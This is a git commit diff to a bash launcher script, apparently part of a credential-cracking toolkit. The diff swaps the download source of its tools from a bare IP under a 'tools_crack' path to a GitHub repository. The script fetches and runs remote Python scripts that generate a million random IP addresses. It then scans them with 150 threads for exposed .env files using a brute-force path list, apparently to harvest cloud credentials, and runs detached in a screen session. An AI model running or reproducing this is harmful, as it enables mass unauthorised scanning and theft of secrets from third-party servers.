cd24e6bc21c580bd776662fa16ea79ef582868ce
priv8-app <126724760+priv8-app@users.noreply.github.com>
2024-03-13 14:31:10 +0800

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 # Rahim AR
 
-rm -rf 1.sh 2.sh 3.sh && echo 'rm -rf aws.py ipgenport.py ipgen.txt ip1.txt ip2.txt ip3.txt ip4.txt ip5.txt .yukin0shita_session 1 2 3 4 5 v5.py && rm -rf aws.py ipgenport.py ipgen.txt ip1.txt ip2.txt ip3.txt ip4.txt ip5.txt .yukin0shita_session 1 2 3 4 5 v5.py env.txt && wget http://20.46.227.36/tools_crack/ipgenport.py && wget http://20.46.227.36/tools_crack/aws.py && wget https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/env.txt && python3 ipgenport.py 1 1000000 && python3 aws.py -l 1 -t 150 -timeout 10 -d -a env -custom env.txt -f' >> 1.sh
+rm -rf 1.sh 2.sh 3.sh && echo 'rm -rf aws.py ipgenport.py ipgen.txt ip1.txt ip2.txt ip3.txt ip4.txt ip5.txt .yukin0shita_session 1 2 3 4 5 v5.py && rm -rf aws.py ipgenport.py ipgen.txt ip1.txt ip2.txt ip3.txt ip4.txt ip5.txt .yukin0shita_session 1 2 3 4 5 v5.py env.txt && wget https://raw.githubusercontent.com/priv8-app/tools/main/ipgenport.py && wget https://raw.githubusercontent.com/priv8-app/tools/main/aws.py && wget https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/env.txt && python3 ipgenport.py 1 1000000 && python3 aws.py -l 1 -t 150 -timeout 10 -d -a env -custom env.txt -f' >> 1.sh
 chmod +x 1.sh
 screen -dmS sesi_1 ./1.sh
 echo "DONE AUTO RUN SESSION 1"
